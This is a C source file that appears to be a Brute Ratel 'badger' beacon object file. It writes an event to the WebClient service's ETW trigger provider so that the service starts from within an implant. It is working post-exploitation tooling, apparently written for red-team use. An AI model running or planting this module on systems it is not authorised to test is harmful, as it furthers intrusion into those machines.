#include <windows.h>
#include <evntprov.h>

#include "badger_exports.h"

DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventRegister(LPCGUID ProviderId, PENABLECALLBACK EnableCallback, PVOID CallbackContext, PREGHANDLE RegHandle);
DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventWrite(REGHANDLE RegHandle, PCEVENT_DESCRIPTOR EventDescriptor, ULONG UserDataCount, PEVENT_DATA_DESCRIPTOR UserData);
DECLSPEC_IMPORT ULONG EVNTAPI ADVAPI32$EventUnregister(REGHANDLE RegHandle);

void coffee(char** argv, int argc, WCHAR** dispatch) {
    ULONG status = ERROR_SUCCESS;
    REGHANDLE RegistrationHandle;
    EVENT_DESCRIPTOR EventDescriptor;
    const GUID _MS_Windows_WebClntLookupServiceTrigger_Provider =
        { 0x22B6D684, 0xFA63, 0x4578,
        { 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 } };

    status = ADVAPI32$EventRegister(&_MS_Windows_WebClntLookupServiceTrigger_Provider, NULL, NULL, &RegistrationHandle);
    if (status != ERROR_SUCCESS) {
        BadgerDispatch(dispatch, "[!] EventRegister failed with error value %lu\n", status);
        return;
    }

    EventDescCreate(&EventDescriptor, 1, 0, 0, 4, 0, 0, 0);
    status = ADVAPI32$EventWrite(RegistrationHandle, &EventDescriptor, 0, NULL);
    if (status != ERROR_SUCCESS) {
        BadgerDispatch(dispatch, "[!] EventWrite failed with 0x%x\n", status);
        return;
    }

    ADVAPI32$EventUnregister(RegistrationHandle);
    BadgerDispatch(dispatch, "[*] WebClient service started successfully.\n");
}
